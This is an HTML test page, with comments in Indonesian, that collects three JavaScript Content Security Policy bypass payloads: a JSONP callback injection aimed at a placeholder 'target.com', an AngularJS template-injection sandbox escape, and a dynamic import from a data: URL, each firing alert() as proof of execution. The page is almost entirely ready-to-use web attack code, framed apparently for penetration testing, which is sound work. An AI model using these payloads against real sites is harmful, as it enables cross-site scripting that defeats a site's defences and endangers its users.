<!DOCTYPE html>
<html>
<head>
<!-- Test CSP bypass methods -->
</head>
<body>
<script>
// CSP Bypass via JSONP endpoints
function cspBypassJsonp() {
    // Cari JSONP endpoints yang tidak properly filtered
    const script = document.createElement('script');
    script.src = 'https://target.com/api/jsonp?callback=alert(document.domain)';
    document.head.appendChild(script);
}

// CSP Bypass via AngularJS injection
function cspBypassAngular() {
    // Jika site pakai AngularJS, coba injection
    const appElement = document.createElement('div');
    appElement.setAttribute('ng-app', '');
    appElement.innerHTML = '{{constructor.constructor("alert(1)")()}}';
    document.body.appendChild(appElement);
}

// Dynamic import bypass
async function cspBypassDynamicImport() {
    try {
        const module = await import('data:text/javascript,alert("CSP bypass")');
    } catch(e) {}
}
</script>
<button onclick="cspBypassJsonp()">Test CSP Bypass</button>
</body>
</html>
